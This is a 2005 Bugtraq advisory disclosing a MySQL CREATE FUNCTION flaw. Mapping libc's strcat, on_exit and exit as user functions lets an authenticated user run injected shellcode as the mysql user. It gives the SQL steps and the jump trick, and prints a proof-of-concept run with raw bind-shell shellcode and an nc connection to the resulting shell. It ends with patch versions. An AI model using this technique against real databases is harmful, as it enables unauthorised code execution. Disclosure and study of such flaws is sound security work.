@@ -1,0 +1,220 @@
+
+Date: Fri, 11 Mar 2005 00:08:44 +0100
+From: Stefano Di Paola <stefano.dipaola@...ec.it>
+To: Bugtraq <bugtraq@...urityfocus.com>
+Subject: Mysql CREATE FUNCTION libc arbitrary code execution.
+
+3. Mysql CREATE FUNCTION libc arbitrary code execution.
+
+Author: Stefano Di Paola
+Vulnerable: Mysql <= 4.0.23, 4.1.10 
+Type of Vulnerability: Local/Remote - input validation
+Tested On : Mandrake 10.1 /Debian Sarge
+Vendor Status: Notified on March 2005
+
+-- Description 
+
+If an authenticated user has INSERT and DELETE privileges on 'mysql'
+administrative database, it is possible, by using the CREATE FUNCTION
+command, to take advantage by functions from libc in order to gain mysql
+user privileges.
+
+Let's see what is the issue.
+
+The structs defined in include/mysql_com.h are
+
+ 196  typedef struct st_udf_args
+ 197  {
+ 198	unsigned int arg_count; 	      /* Number of arguments */
+ 199	enum Item_result *arg_type;	      /* Pointer to item_results */
+ 200	char **args;			      /* Pointer to argument */
+ 201	unsigned long *lengths; 	      /* Length of string arguments */
+ 202	char *maybe_null;		      /* Set to 1 for all maybe_null args */
+ 203  } UDF_ARGS;
+ 204  
+ 205	/* This holds information about the result */
+ 206  
+ 207  typedef struct st_udf_init
+ 208  {
+ 209	my_bool maybe_null;		      /* 1 if function can return NULL */
+ 210	unsigned int decimals;  	      /* for real functions */
+ 211	unsigned long max_length;	      /* For string functions */
+ 212	char	*ptr;			      /* free pointer for function data */
+ 213	my_bool const_item;		      /* 0 if result is independent of
+arguments */
+ 214  } UDF_INIT;
+ 215  
+
+the order MySql use this structs when a function 'xxx' is called from
+sql_udf.h (from Mysql Manual) is the following.
+
+For STRING functions:
+
+char *xxx(UDF_INIT *initid, UDF_ARGS *args,
+          char *result, unsigned long *length,
+          char *is_null, char *error);
+
+For INTEGER functions:
+
+long long xxx(UDF_INIT *initid, UDF_ARGS *args,
+              char *is_null, char *error);
+
+
+so the first argument is a UDF_INIT pointer and the second one is
+UDF_ARGS pointer.
+
+by using on_exit, strcat (or strcpy) and exit libc function we could
+change the execution flow.
+
+from man strcat:
+....
+char *strcat(char *dest, const char *src);
+....
+
+from man on_exit:
+....
+      int on_exit(void (*function)(int , void *), void *arg);
+
+DESCRIPTION
+       The on_exit() function registers the given function  to  be
+called  at normal  program termination, whether via exit(3) or via
+return from the program's main.  The function is passed the argument to
+exit(3) and the arg argument from on_exit().
+....
+
+from man exit:
+....
+       void exit(int status);
+DESCRIPTION
+       The exit() function causes normal program termination and the the
+value of status & 0377 is returned to the parent (see  wait(2)).   All
+functions  registered with atexit() and on_exit() are called in the
+reverse order of their registration, and  all  open  streams  are
+flushed  and closed.  Files created by tmpfile() are removed.
+....
+
+
+what would happen if we use these functions on mysql?
+
+CREATE FUNCTION 'strcat' RETURNS STRING SONAME 'libc.so.6';
+will call
+ strcat(UDF_INIT *initid, UDF_ARGS *args)
+ 
+ catting the value pointed by args (arg_count) in the location where
+initid points.
+
+CREATE FUNCTION 'on_exit' RETURNS INTEGER SONAME 'libc.so.6';
+ will call
+  on_exit(UDF_INIT *initid, UDF_ARGS *args)
+
+ registering the function pointed by initid.
+
+CREATE FUNCTION 'exit' RETURNS INTEGER SONAME 'libc.so.6';
+ will call
+  exit( initid)
+ exiting with status initd.
+
+Next step is understand how it works.
+
+Supposing we have created strcat, on_exit and exit into MySql DBMS,
+mysql> select on_exit(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+  ->,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)\G
+...
+mysql> select strcat(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+  ->,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)\G
+*************************** 1. row ***************************
+strcat(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\
+        0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0): 1
+1 row in set (0.00 sec)
+mysql> select exit();
+Lost Connection.
+
+What happened?
+
+We registered the location pointed by initid to be executed on exit by
+using on_exit, then we overwrote *initd with strcat and finally we
+called exit.
+
+Now mysql daemon follow this flow:
+1. exit is called, then jump to initid and execute location.
+2. location contains the following value: 0x00000001 corresponding to
+some non useful opcode.
+3. so mysql crashes and exits.
+
+by using this feature we can add a number of arguments to inject a
+simple opcode for  our aim.
+
+by looking into memory with gdb we'll see that the string
+strcat(0,0,0,0,.....
+is very near (a bunch of bytes that for me is 0x3d) to address pointed
+by 'initid' so by using the opcode
+
+0x3deb jmp 0x3d
+
+we'll jump to the command we sent....
+So, by using as first argument a shellcode, mysql will execute it.
+
+A proof of concept is attached.
+
+$ perl exp3.pl 3 0
+Using 3de9
+Create Function
+select    on_exit('jfXj[RSjáÍRChÿ
+ájQPáÆ°fÍCC°fÍRVáC°fÍÙÃ°?IÍAâøRhn/shh//biãRSá°
+                                              Í', 0),   strcat(0);Select
+on_exit
+$VAR1 = {
+          'on_exit(\'jfXj[RSjáÍRChÿ
+ájQPáÆ°fÍCC°fÍRVáC°fÍÙÃ°?IÍAâøRhn/shh//biãRSá°
+                                              Í
+\',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+					      0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+					      0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+					      0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,' => 
+					      '592229467032649728',
+          'strcat(0)' => 'HPh?strcat(0P'
+        };
+DBD::mysql::st execute failed: Lost connection to MySQL server during
+query at myexp.pl line 112.
+DBD::mysql::st execute failed: Lost connection to MySQL server during
+query at myexp.pl line 112.
+_
+
+now open another shell and
+
+$ nc 127.0.0.1 2707
+id
+uid=78(mysql) gid=78(mysql) groups=78(mysql)
+^C
+$
+
+
+
+
+-- Solution
+
+Mysql Company released a patch.
+New versions for MySQL 4.0.24 and  4.1.10a have been released. Download
+them to fix the issue.
+
+Thanks to MySQL people, they where very kind and professional.
+
+-- Disclaimer
+
+In no event shall the author be liable for any damages 
+whatsoever arising out of or in connection with the use 
+or spread of this information. 
+Any use of this information is at the user's own risk.
+
+
+-- 
+
+......---oOOo--------oOOo---......
+Stefano Di Paola
+Software Engineer
+Email: stefano.dipaola_at_wisec.it
+Email: stefano.dipaola1_at_tin.it
+Web: www.wisec.it
+..................................
+
+Download attachment "exp3.pl" of type "application/x-perl" (3872 bytes)
